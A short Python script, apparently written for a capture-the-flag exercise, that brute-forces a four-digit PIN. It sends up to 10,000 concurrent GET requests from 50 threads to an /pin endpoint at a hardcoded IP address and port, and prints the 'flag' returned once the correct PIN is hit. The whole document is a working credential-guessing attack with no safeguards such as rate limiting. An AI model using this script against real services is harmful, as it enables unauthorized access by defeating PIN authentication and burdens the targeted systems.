import requests
from concurrent.futures import ThreadPoolExecutor

ip = '94.237.60.154'
port = '59390'

def try_pin(pin):    
    formatted_pin = f"{pin:04d}"
    print(f"Attemp PIN: {formatted_pin}")

    try:
                #send request
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
                        
                #Check if server responds with success and flag is found
        if response.ok and 'flag' in response.json(): 
            print(f"[+] Correct pin found: {formatted_pin}")
            print(f"[+] FLAG: {response.json()['flag']}")
            return True
    except Exception as e:
        return False

with ThreadPoolExecutor(max_workers=50) as pool:
    for result in pool.map(try_pin, range(10000)):
        if result:
            break
